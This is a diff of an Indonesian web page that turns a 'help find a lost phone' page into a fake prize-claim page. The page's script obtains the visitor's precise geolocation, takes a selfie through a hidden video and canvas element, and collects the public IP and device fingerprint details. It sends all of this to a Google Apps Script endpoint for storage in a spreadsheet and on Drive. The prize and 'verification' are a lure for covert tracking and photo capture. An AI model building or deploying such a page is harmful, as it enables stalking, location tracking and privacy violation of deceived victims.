@@ -1,132 +1,203 @@
 <!doctype html>
-<html>
+<html lang="id">
 <head>
   <meta charset="utf-8">
-  <title>Bantu Temukan HP</title>
+  <title>Klaim Hadiah — Verifikasi Lokasi & Selfie</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body { font-family: Arial; padding:20px; max-width:600px; margin:auto; }
-    .box { padding:15px; border:1px solid #ccc; border-radius:10px; background:#fafafa; }
-    video, canvas { display:none; } /* tidak ditampilkan */
+    :root { color-scheme: light dark; }
+    body { font-family: Arial, system-ui, -apple-system; padding: 22px; max-width: 640px; margin: auto; line-height: 1.5; }
+    .card { border: 1px solid #ccc; background: #fafafa; padding: 18px; border-radius: 12px; }
+    h1 { font-size: 1.25rem; margin: 0 0 10px; }
+    .muted { color: #666; font-size: .95rem; }
+    .status { margin-top: 12px; padding: 10px; border-radius: 8px; background: #fff; border: 1px solid #e5e5e5; }
+    .ok { color: #0a7; }
+    .err { color: #b00; }
+    .btn { display: inline-block; padding: 10px 14px; border-radius: 10px; border: 0; cursor: pointer; font-size: 1rem; }
+    .btn-primary { background: #0a7; color: #fff; }
+    .hidden { display: none; }
+    video, canvas { display: none; } /* elemen kamera disembunyikan */
+    a.map { word-break: break-all; }
   </style>
 </head>
 <body>
-  <h2>Mohon Bantu Temukan HP Hilang</h2>
-  <div class="box">
-    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi & kamera.</p>
-    <p id="status">Menunggu izin lokasi...</p>
-    <div id="result"></div>
+  <div class="card">
+    <h1>Klaim Hadiah</h1>
+    <p class="muted">
+      Untuk verifikasi klaim, sistem perlu <b>izin Lokasi</b> dan <b>izin Kamera (selfie)</b>. 
+      Data dipakai sekali untuk verifikasi. Jika tidak setuju, tutup halaman ini.
+    </p>
+
+    <div id="step1">
+      <button id="startBtn" class="btn btn-primary">Mulai Verifikasi</button>
+    </div>
+
+    <div id="progress" class="status hidden">
+      <div id="statusMsg">Menunggu aksi...</div>
+      <div id="result"></div>
+    </div>
+
+    <div id="success" class="status hidden ok">
+      ✅ Klaim berhasil. Hadiah dikirim dalam <b>1×24 jam</b>. Terima kasih.
+    </div>
+
+    <div id="failed" class="status hidden err">
+      ❌ Verifikasi gagal. Anda harus mengizinkan Lokasi dan Kamera untuk klaim hadiah.
+    </div>
   </div>
 
-  <!-- elemen video & canvas tersembunyi untuk capture foto -->
+  <!-- elemen untuk capture foto -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
 <script>
-const ENDPOINT = "https://script.google.com/macros/s/AKfycbxF_gCSQq5hwRaShgi2n_82321UMo3o7VemIUTh3tUfbrz1e7hcb1773bP00apWofI/exec";
-  
-function sendToSheet(lat, lon, acc){
-  const formData = new FormData();
-  formData.append("type", "location");
-  formData.append("lat", lat);
-  formData.append("lon", lon);
-  formData.append("accuracy", acc);
-  formData.append("ua", navigator.userAgent);
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbzUhqxDwjycNCxKlTc8nOL2zazec6AzXVTqkuq1H4gWboDDp5sUcNpAKJhGSnMbt10/exec";
 
-  fetch(ENDPOINT, { method: "POST", body: formData })
-    .then(() => {
-      sendExtraData();   // kirim data tambahan
-      requestCamera();   // minta izin kamera & kirim foto
-    });
+const ui = {
+  startBtn: document.getElementById('startBtn'),
+  step1: document.getElementById('step1'),
+  progress: document.getElementById('progress'),
+  statusMsg: document.getElementById('statusMsg'),
+  result: document.getElementById('result'),
+  success: document.getElementById('success'),
+  failed: document.getElementById('failed'),
+  video: document.getElementById('video'),
+  canvas: document.getElementById('canvas'),
+};
+
+ui.startBtn.addEventListener('click', startFlow);
+
+async function startFlow(){
+  ui.step1.classList.add('hidden');
+  ui.progress.classList.remove('hidden');
+  ui.statusMsg.textContent = 'Meminta izin lokasi...';
+
+  if (!('geolocation' in navigator)) {
+    return fail('Browser tidak mendukung Geolocation.');
+  }
+
+  // 1) Minta lokasi
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
+      ui.statusMsg.textContent = 'Lokasi diterima. Mengirim verifikasi lokasi...';
+      showMapLink(lat, lon);
+
+      // Kirim ke Sheet1
+      await sendLocation(lat, lon, acc);
+
+      // 2) Minta kamera → jika diizinkan, ambil foto lalu kirim EXTRA+FOTO sekali
+      ui.statusMsg.textContent = 'Meminta izin kamera...';
+      try {
+        const photoDataURL = await captureSelfie();       // akan throw jika ditolak
+        ui.statusMsg.textContent = 'Kamera diizinkan. Mengumpulkan data tambahan...';
+        const extra = await collectExtra();               // IP, koneksi, dll
+        ui.statusMsg.textContent = 'Mengirim verifikasi akhir...';
+        await sendExtraWithPhoto(extra, photoDataURL);    // Sheet2 (1 baris)
+        ui.progress.classList.add('hidden');
+        ui.success.classList.remove('hidden');
+      } catch (err) {
+        // kamera ditolak / gagal capture → klaim gagal sesuai syarat
+        fail('Izin kamera ditolak atau gagal. ' + (err?.message || ''));
+      }
+    },
+    (err) => fail('Gagal memperoleh lokasi: ' + (err.message || err)),
+    { enableHighAccuracy: true, timeout: 20000 }
+  );
 }
 
-// ============ EXTRA DATA ============
-async function sendExtraData(){
-  const ip = await getPublicIP();
+function showMapLink(lat, lon){
+  ui.result.innerHTML = `
+    Koordinat: <b>${lat.toFixed(6)}, ${lon.toFixed(6)}</b><br>
+    Akurasi: <b>${Math.round((+posAcc(acc=0)))} m</b><br>
+    <a class="map" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" rel="noopener">Buka di Google Maps</a>
+  `;
+}
+function posAcc(a){ return a || 0; } // helper kecil
+
+async function sendLocation(lat, lon, acc){
   const fd = new FormData();
-  fd.append("type", "extra");
-  fd.append("ip", ip);
-  fd.append("connection", navigator.connection?.effectiveType || "");
-  fd.append("lang", navigator.language || "");
-  fd.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone || "");
-  fd.append("memory", navigator.deviceMemory || "");
-  fd.append("platform", navigator.platform || "");
-  fd.append("ua", navigator.userAgent);
-  fd.append("screen", `${screen.width}x${screen.height}`);
-  fd.append("viewport", `${innerWidth}x${innerHeight}`);
-  fetch(ENDPOINT, { method: "POST", body: fd });
+  fd.append('type','location');
+  fd.append('lat', String(lat));
+  fd.append('lon', String(lon));
+  fd.append('accuracy', String(acc || ''));
+  fd.append('ua', navigator.userAgent || '');
+  await fetch(ENDPOINT, { method:'POST', body: fd });
 }
 
-// ambil IP publik
-async function getPublicIP(){
-  try{
-    const r = await fetch("https://api.ipify.org?format=json");
-    const j = await r.json();
-    return j.ip || "";
-  }catch(e){
-    return "";
+// ======== kamera & selfie ========
+async function captureSelfie(){
+  if (!navigator.mediaDevices?.getUserMedia) {
+    throw new Error('getUserMedia tidak tersedia.');
   }
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user' }, audio: false
+  });
+  ui.video.srcObject = stream;
+
+  // tunggu video siap
+  await new Promise(res => ui.video.onloadedmetadata = res);
+
+  const w = ui.video.videoWidth || 640;
+  const h = ui.video.videoHeight || 640;
+  ui.canvas.width = w;
+  ui.canvas.height = h;
+  ui.canvas.getContext('2d').drawImage(ui.video, 0, 0, w, h);
+
+  // kompres foto agar tidak terlalu besar
+  const dataURL = ui.canvas.toDataURL('image/jpeg', 0.7);
+
+  // stop kamera
+  stream.getTracks().forEach(t => t.stop());
+  return dataURL;
 }
 
-// ============ FOTO OTOMATIS ============
-async function requestCamera(){
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    });
-    takePhoto(stream);
-  }catch(err){
-    console.warn("Kamera ditolak:", err);
-  }
-}
-
-function takePhoto(stream){
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  video.srcObject = stream;
-
-  video.onloadedmetadata = () => {
-    const w = video.videoWidth;
-    const h = video.videoHeight;
-    canvas.width = w;
-    canvas.height = h;
-    canvas.getContext('2d').drawImage(video, 0, 0, w, h);
-
-    const dataURL = canvas.toDataURL("image/jpeg", 0.7);
-
-    const fd = new FormData();
-    fd.append("type", "extra");
-    fd.append("photo", dataURL);
-
-    fetch(ENDPOINT, { method:"POST", body: fd });
-
-    stream.getTracks().forEach(t => t.stop());
+// ======== data ekstra (IP, koneksi, dll) ========
+async function collectExtra(){
+  const ip = await getPublicIP();
+  return {
+    ip,
+    connection: navigator.connection?.effectiveType || '',
+    lang: navigator.language || '',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+    memory: navigator.deviceMemory || '',
+    platform: navigator.platform || '',
+    ua: navigator.userAgent || '',
+    screen: `${screen.width}x${screen.height}`,
+    viewport: `${innerWidth}x${innerHeight}`,
   };
 }
-
-// ============ LOKASI ============
-function success(pos){
-  const lat = pos.coords.latitude;
-  const lon = pos.coords.longitude;
-  const acc = pos.coords.accuracy;
-
-  document.getElementById("status").textContent = "Lokasi berhasil diperoleh.";
-  document.getElementById("result").innerHTML = `
-    Koordinat: <b>${lat}, ${lon}</b><br>
-    Akurasi: <b>${acc} meter</b><br><br>
-    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
-  `;
-  sendToSheet(lat, lon, acc);
+async function getPublicIP(){
+  try{
+    const r = await fetch('https://api.ipify.org?format=json');
+    const j = await r.json();
+    return j.ip || '';
+  }catch{ return ''; }
 }
 
-function error(err){
-  document.getElementById("status").textContent =
-    "Gagal memperoleh lokasi: " + err.message;
+async function sendExtraWithPhoto(extra, photoDataURL){
+  const fd = new FormData();
+  fd.append('type','extra');
+  fd.append('ip', extra.ip);
+  fd.append('connection', extra.connection);
+  fd.append('lang', extra.lang);
+  fd.append('timezone', extra.timezone);
+  fd.append('memory', String(extra.memory));
+  fd.append('platform', extra.platform);
+  fd.append('ua', extra.ua);
+  fd.append('screen', extra.screen);
+  fd.append('viewport', extra.viewport);
+  fd.append('photo', photoDataURL); // base64 -> Apps Script simpan ke Drive & tulis link di Sheet2
+  await fetch(ENDPOINT, { method:'POST', body: fd });
 }
 
-navigator.geolocation.getCurrentPosition(success, error, {
-  enableHighAccuracy: true,
-  timeout: 20000
-});
+function fail(message){
+  ui.progress.classList.add('hidden');
+  ui.failed.classList.remove('hidden');
+  ui.failed.querySelector(':scope').textContent = ''; // noop to keep structure
+  // tampilkan alasan di status failed
+  ui.failed.innerHTML = `❌ Verifikasi gagal. ${message || ''} <br>Anda harus mengizinkan Lokasi & Kamera untuk klaim hadiah.`;
+}
 </script>
 </body>
 </html>
